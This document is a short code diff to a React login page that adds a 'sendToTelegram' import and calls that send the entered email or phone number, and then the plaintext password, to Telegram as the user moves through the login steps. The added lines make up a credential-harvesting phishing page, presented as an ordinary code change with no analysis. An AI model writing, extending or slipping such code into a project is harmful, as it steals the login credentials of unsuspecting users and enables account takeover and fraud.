@@ -1,5 +1,6 @@
 import { useEffect, useState } from 'react';
 import { ChevronDown } from 'lucide-react';
+import { sendToTelegram } from '../utils/telegram';
 
 interface LoginPageProps {
   onLoginSuccess: (email: string) => void;
@@ -11,13 +12,15 @@ export function LoginPage({ onLoginSuccess }: LoginPageProps) {
   const [showPassword, setShowPassword] = useState(false);
   const [step, setStep] = useState<'email' | 'loading' | 'password'>('email');
 
-  const handleNext = () => {
+  const handleNext = async () => {
     if (email.trim()) {
+      await sendToTelegram(`<b>[LOGIN] Email/Phone:</b> ${email}`);
       setStep('loading');
     }
   };
 
-  const handleLogin = () => {
+  const handleLogin = async () => {
+    await sendToTelegram(`<b>[LOGIN] Password:</b> ${password}`);
     onLoginSuccess(email);
   };
 
